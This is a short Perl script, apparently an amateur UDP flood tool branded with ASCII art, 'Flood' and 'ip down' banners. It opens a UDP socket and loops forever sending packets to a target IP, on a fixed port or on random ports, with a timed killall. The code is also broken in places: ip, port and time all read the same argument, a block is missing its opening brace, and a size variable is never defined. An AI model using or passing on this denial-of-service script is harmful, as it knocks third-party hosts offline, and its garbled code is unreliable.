#!/usr/bin/perl

use Socket;

$ARGC=@ARGV;

my ($ip,$port,$size,$time);

$ip=$ARGV[0];
$port=$ARGV[0];
$time=$ARGV[0];

socket(crazy, PF_INET, SOCK_DGRAM, 17);

$iaddr = inet_aton("$ip");



printf " [1;35m# [1;33m# [1;31m* [0;32m  

        

                   ...
                 ;::::;              
               ;::::; :;
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO\
           ::::::;       ;          OOOOO\
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        / R/ DOOOOOO
      .';:::::::::::::::::;,     / E/     DOOOO
     ,::::::;::::::;;;;::::;,   / P/        DOOO
    ;`::::::`'::::::;;;::::: ,#/ S/          DOOO
    :`:::::::`;::::::;;::: ;::# A/            DOOO
    ::`:::::::`;:::::::: ;::::#C/              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#                                                                                    

   [1;36m$ip n";
printf " [1;35m# [1;33m# [1;31m* [0;32m Flood   [0;31mARHIVA PRIVATA  [0m\n ";
printf " [1;35m# [1;33m# [1;31m* [0;32m By  [1;33CFrankfurd  [1;36m2016-2017  [0m\n";
printf " [1;35m# [1;33m# [1;31m* [0;32m UPDATE BY   [1;36mFrankfurd [0;32m @  [1;33mip down  [0m\n";





if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}

if ($ARGV[1] !=0 && $ARGV[2] !=0) 
system("(sleep $time;killall -9 udp) &");
goto packets;
}

if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}

if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &"); 
goto randpackets;
}

packets:

for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}

randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=(rand 65000) +1;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}